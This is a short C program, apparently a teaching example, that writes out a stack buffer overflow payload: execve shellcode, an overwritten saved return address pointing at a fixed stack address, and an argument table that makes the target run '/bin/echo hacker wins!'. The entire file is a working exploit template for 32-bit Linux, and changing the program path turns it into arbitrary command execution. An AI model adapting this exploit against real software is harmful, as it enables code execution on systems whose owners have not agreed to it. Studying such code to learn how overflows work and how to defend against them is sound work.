#include <stdio.h>

#define BUFFER 0xbffff7c0

#define ATTACK_IN_TARGET ((struct bomb *)BUFFER)

struct bomb {
    char code[1024];
    char *link;
    char *retvalue;
    char *table[3];
    char echo[16];
    char message[64];
} attack = {
    "\xb8\x0b\0\0\0" /* movl $0x0b,%eax (execve) */
    "\xbb\0\0\0\0"   /* movl $0,%ebx (program) */
    "\xb9\0\0\0\0"   /* movl $0,%ecx (table) */
    "\xba\0\0\0\0"   /* movl $0,%edx (environment) */
    "\xcd\x80",      /* int $0x80 (linux system call interface) */

    NULL,            /* saved ebp */
    (char *)BUFFER,  /* saved eip */
    {ATTACK_IN_TARGET->echo,
     ATTACK_IN_TARGET->message,
     NULL},          /* argument table for execve */
    "/bin/echo",
    "hacker wins!"
};

main() {
    *(char **)(attack.code + 6) = ATTACK_IN_TARGET->echo;
    *(char ***)(attack.code + 11) = ATTACK_IN_TARGET->table;
    fwrite((void *)&attack, 1, sizeof attack, stdout);
}